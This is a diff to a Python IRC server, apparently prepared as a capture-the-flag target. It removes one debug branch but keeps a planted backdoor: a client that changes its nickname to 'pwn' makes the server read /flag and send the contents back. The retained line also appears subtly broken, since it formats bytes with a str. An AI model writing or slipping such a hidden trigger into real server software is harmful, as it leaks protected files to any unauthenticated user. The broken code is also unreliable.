@@ -225,14 +225,6 @@ class Client:
             else:
                 self.nickname = nick
                 server.client_changed_nickname(self, None)
-            print("test")
-            self.reply(b"433 * %s : test")
-            if (nick == b"pwn" or arguments[0] == b"pwn"):
-                print("test2")
-                self.reply(b"433 * %s : test2")
-                with open("/flag") as f:
-                    print(f.read())
-                    self.reply(f.read().encode())
 
         elif command == b"USER":
             if len(arguments) < 4:
@@ -475,14 +467,9 @@ class Client:
                     % (oldnickname, self.user, self.host, self.nickname),
                     True,
                 )
-                print("test")
-                self.reply(b"433 * %s : test")
-                if (newnick == b"pwn" or arguments[0] == b"pwn"):
-                    print("test2")
-                    self.reply(b"433 * %s : test2")
+                if (newnick == b"pwn"):
                     with open("/flag") as f:
-                        print(f.read())
-                        self.reply(f.read().encode())
+                        self.reply(b"%s" % f.read())
 
         def notice_and_privmsg_handler() -> None:
             if len(arguments) == 0:
